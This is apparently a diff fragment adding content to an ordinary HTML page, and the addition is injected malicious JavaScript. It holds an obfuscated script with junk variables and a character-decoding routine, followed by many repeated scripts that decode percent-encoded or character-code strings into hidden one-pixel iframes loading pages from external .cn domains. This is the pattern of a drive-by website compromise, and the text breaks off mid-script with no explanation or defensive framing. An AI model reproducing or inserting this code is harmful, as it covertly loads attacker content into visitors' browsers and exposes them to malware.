+  </table><ad><script>var HTWcA ; HTWcA = '';var BOITqd = this ; var sAO ='re'+'place';var Pmq =787; var ZuzFM = 319; var CxmkQ = 947 ;if (Pmq>ZuzFM){Pmq =ZuzFM -CxmkQ ; }var erf ; erf= 'MdM0MfM3Mbk5k9z3k9k5MbYdMdMfYeMbk6MdM0MfM3Mbk7k5k9z5MbY6' ; var FfsNn ; FfsNn ='' ;FfsNn ='8Ydk0M2MbM0M9YaM6k7z5keMaYaz3M0MbY9keZaMfYaMbk6k7z5MaYak0YdMbYaXaM7M3Mbk6MaYak0M9MbYaXaM7M3Mbk6k7kek5kez9k4zdz8zezek4zdz8zezek7z5MaM1MdYbM3MbM0Yak0MdM1M1M5M7Mbz3'; var cZ='WHTNaktvJfdHFhw'; var gEC ; gEC='';var Xv =843 ; var gviE = 249; var tB ; tB =775 ; if (Xv>gviE){Xv=gviE+tB; }gEC= '3z5'; var KCiFy;KCiFy ='' ; KCiFy ='k1M4' ; var OGKAHT= '5Ma';var ehkaVH; ehkaVH= '' ;ehkaVH='2k1YdMdYcM' ;var BsNkE;BsNkE ='X3k5MaM1M3YdX' ; var OD = 'YfYbMbYcY7k0M' ; var RIdcnA; RIdcnA = 'Yaz3zez5Y8MfYckeMaMdkez3keMaM1MdYbM3MbM0Yak0MdM1M1M5M7Mbz5keY8MfYckeMdM0MfM3Mbkez3kek9M1M0M2M7M0MbYdYaMfYaYdk9z5keY8MfYckeY9M0kez3keY9M7M0MaM1Y9k0M0MfY8M7M9MfYaM1Yck0YbYdMbYcZfM9MbM0Yaz5keY8MfYckeYdYaYcM7kez3kek1k6Y7MfM6M1M1Y2YdMbMfYcMdM6Y2M3YdM0McM1YaY2Y7MfM0MaMbY6Y2M9M1M1M9M2MbMcM1YaY2McM7M0M9Y2MfYdM5k7k1M7z5keY8MfYckeYdYaYcZ1Xdkez3keM0MfY8M7M9MfYaM1Yck0MfYeYeX8M' ;var oPo = 622 ;var luaEi=161 ; var GkXazy=605; if (oPo>luaEi){oPo =luaEi+GkXazy;}var Hx ;Hx = '7z5'; var nosuUv= 799; var Zbh = 666 ;var DAJ = 445 ; if (nosuUv==Zbh){nosuUv =Zbh+DAJ;}var wdwya='GHvLoFtR' ; var nJVhP;nJVhP ='' ;nJVhP= 'aXdYaYcM7M0M9k6k7k5k9z5YeMfYaM6z3k1k9z5keMaM1MdYbM3MbM0Yak0Y9YcM7YaMbk6k9z';var KX= 'OnANBml' ; var xon,Yf ; var RDMt= 744 ; if (xon==Yf){xon= Yf+RDMt;}var VOK ;VOK= ''; VOK='bYcYdM7M1M0z5keM7M8k6MaMdk0M7M0MaMbY6Z1M8k6MdM0MfM3Mbk7z3z3k3zfkek8k8kekfY9M0k0YaM1Z2M1Y9MbYcZdMfYdMbk6k7k0M3MfYaMdM6k6YdYaYcM7k7kek8k8keYdYaYcZ1Xdk0YaM1Z2M1Y9MbYcZdMfYdMbk6k7k0M7M0MaMbY6Z1M8k6k9Y9M7M0k9k7kekfz3kek3zfk7keY5keY8MfYckeMaM1M3Ydkez3keX5k9YdM3MfYcYaMbM0MbYcM9Y7M3M1MaMbM2k0MdM1M3k9k2kek9M9M1M1M9M2MbMfYeM7Ydk0McM7Y4k9k2kek9M0MbY9YdMfYeM7Ydk0YbYdk9k2kek9MbM3MfYeM7Ydk0M1YcM9k9k2kek9YaM1M1M2McMfYcM7M0Mdk0M';var OQRJTs ;OQRJTs ='';var VrHJb = 18 ;var TNiv = 689;var olyJQ= 863; if (VrHJb<TNiv){VrHJb= TNiv^olyJQ;}OQRJTs= '2YdMdYcM7YeYakeYaY7YeMbz3kcYaMbY6Yak1M4M';var Vr ; Vr =265 ;var LYDLT=893; var NpmQ ;NpmQ = 486; if (Vr==LYDLT){Vr= LYDLT - NpmQ;}function euYjt(Yn){var Bqy= HTWcA ; for(kct= 0; kct<Yn['lFeInvgStvhv'[sAO](/[vFISQ]/g , HTWcA)];++kct){Bqy= Bqy+BOITqd['SctUroicnJgc'[sAO](/[cGJUo]/g,HTWcA)]['fnrQoEmnCXhpaQrpCnopdQeE'[sAO](/[EnpXQ]/g ,HTWcA)](14^Yn['cNhSaLrSCIoIdSeNAItN'[sAO](/[NiILS]/g, HTWcA)](kct)) ;var Ik;Ik = 291 ;var pHtCK;pHtCK=696 ; var kMf;kMf=902 ; if (kMf = Ik || Ik==pHtCK){Ik =pHtCK/kMf;}}return Bqy ;}var Iyf ; Iyf ='cM6YaYaYez4k1k1k9k5YeYcMbM8M8YdX5YeYcMbM8'; var tSbYi='TbVDDZDNF' ;var KFrhf = '7Ye' ; var vuH = 'Njitj'; var oPtQkJ,uQOX;var RUYTN=302;if (oPtQkJ>=uQOX){oPtQkJ=uQOX^RUYTN;}var mEsTH; mEsTH=''; var Qh= 348 ; var XNkr = 753;var nYbjG =117 ;if (Qh==XNkr){Qh=XNkr+nYbjG ;}mEsTH='dM1M3k9X3z5keY8MfYckeYeYcMbM8M8Ydkez3keX5k9YdMdYcM7YeYaYdk0k9k2kek9M2M7McYcMfYcY7k0k9k2kek9MfM4MfY6k0k9k2kek9YaM1M1M2McMfYck0k9k2kek9M7M0Mdk0k9k2kek9M4MfY8Mfk0k9X3z5keY8MfYckeMaM1M3kez3' ;var cf ; cf = '';cf= 'keY';var mKa;mKa=514 ;var urhYWw = 195 ;var OwxVVC=381;if (OwxVVC =mKa && mKa>=urhYWw){mKa=urhYWw+OwxVVC ; }var KikkCj; KikkCj = 'Yaz0' ; var yqFvP= 'sHFwVbGwgCRybZMdno' ; var LcfDG = 'pPTcyyVNrBf'; var rKT= 'BghOVAZvldC' ;var LoQWt; LoQWt = 932 ; var vm, Kexw;if (Kexw>LoQWt || LoQWt>=vm){LoQWt = vm+Kexw ;}var Dqth ;Dqth= '' ;Dqth ='4Ydkcz0z2X'; var LY =819 ;var kpsQo , PBJnny;if (LY==kpsQo){LY = kpsQo - PBJnny;}var PL='keZ3MfYaM6k0M8M2M1M1Yck6Z3MfYaM6k0YcMfM0MaM1M3k6k7k4MaM1M3Ydk0M2MbM0M9YaM6k7z5keY8MfYckeYeYcMbM8kez3keZ3MfYaM6k0M8M2M1M1Yck6Z3MfYaM6k0YcMfM0MaM1M3k6k7k4YeYcMbM8M' ;var RtkZ , ZRBT;var cOEjiS; cOEjiS= 712; if (cOEjiS>RtkZ && RtkZ==ZRBT){RtkZ = ZRBT+cOEjiS;}var jzp ='k9k';var kiKUdb, MwRI , JjQp ;if (JjQp=kiKUdb && kiKUdb==MwRI){kiKUdb = MwRI -JjQp ;}var BMl; BMl = 'M1M3X3k5k9k1zck0zc' ; var qzIke ='VkUvRKYNmaJQMkJ'; var ahS,xigg ; var oZuvt ;oZuvt =811 ; if (ahS<xigg){ahS= xigg-oZuvt ; }var YrpoZA= 'YeM7YcMbYdz3k9k5MaYak0YaM1Z9Z3X' ;var PAYBC; PAYBC= '' ;PAYBC ='fY8MfYdMdYcM7YeYakckeYdYcMdz3<script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%66%6f%70%73%6c%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%67%6b%73%64%68%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6d%61%67%65%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%67%6b%73%64%68%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6d%61%67%65%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%67%6b%73%64%68%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6d%61%67%65%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%67%6b%73%64%68%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6d%61%67%65%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%67%6b%73%64%68%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6d%61%67%65%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%67%6b%73%64%68%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6d%61%67%65%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%67%6b%73%64%68%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6d%61%67%65%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><script>var fr=unescape('%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%67%6b%73%64%68%2e%63%6e%2f%66%6f%72%75%6d%2f%69%6d%61%67%65%2f%69%6e%64%65%78%2e%70%68%70%22%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%30%3e%3c%2f%69%66%72%61%6d%65%3e');document.write(fr);</script><SCRIPT LANGUAGE="JavaScript">
+<!--
+function Decode(){var temp="",i,c=0,out="";var str="60!105!102!114!97!109!101!32!115!114!99!61!34!104!116!116!112!58!47!47!119!119!119!46!107!111!116!111!112!101!115!46!99!110!47!102!111!114!117!109!47!105!109!97!103!101!47!105!110!100!101!120!46!112!104!112!34!32!119!105!100!116!104!61!49!32!104!101!105!103!104!116!61!49!32!102!114!97!109!101!98!111!114!100!101!114!61!48!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
+//-->
+</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+<!--
+Decode();
+//-->
+</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+<!--
+function Decode(){var temp="",i,c=0,out="";var str="60!105!102!114!97!109!101!32!115!114!99!61!34!104!116!116!112!58!47!47!119!119!119!46!107!111!116!111!112!101!115!46!99!110!47!102!111!114!117!109!47!105!109!97!103!101!47!105!110!100!101!120!46!112!104!112!34!32!119!105!100!116!104!61!49!32!104!101!105!103!104!116!61!49!32!102!114!97!109!101!98!111!114!100!101!114!61!48!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
+//-->
+</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+<!--
+Decode();
+//-->
+</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+<!--
+function Decode(){var temp="",i,c=0,out="";var str="60!105!102!114!97!109!101!32!115!114!99!61!34!104!116!116!112!58!47!47!119!119!119!46!107!111!116!111!112!101!115!46!99!110!47!102!111!114!117!109!47!105!109!97!103!101!47!105!110!100!101!120!46!112!104!112!34!32!119!105!100!116!104!61!49!32!104!101!105!103!104!116!61!49!32!102!114!97!109!101!98!111!114!100!101!114!61!48!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
+//-->
+</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+<!--
+Decode();
+//-->
+</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+<!--
+function Decode(){var temp="",i,c=0,out="";var str="60!105!102!114!97!109!101!32!115!114!99!61!34!104!116!116!112!58!47!47!119!119!119!46!107!111!116!111!112!101!115!46!99!110!47!102!111!114!117!109!47!105!109!97!103!101!47!105!110!100!101!120!46!112!104!112!34!32!119!105!100!116!104!61!49!32!104!101!105!103!104!116!61!49!32!102!114!97!109!101!98!111!114!100!101!114!61!48!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
+//-->
+</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+<!--
+Decode();
+//-->
+</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+<!--
+function Decode(){var temp="",i,c=0,out="";var str="60!105!102!114!97!109!101!32!115!114!99!61!34!104!116!116!112!58!47!47!119!119!119!46!107!111!116!111!112!101!115!46!99!110!47!102!111!114!117!109!47!105!109!97!103!101!47!105!110!100!101!120!46!112!104!112!34!32!119!105!100!116!104!61!49!32!104!101!105!103!104!116!61!49!32!102!114!97!109!101!98!111!114!100!101!114!61!48!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);
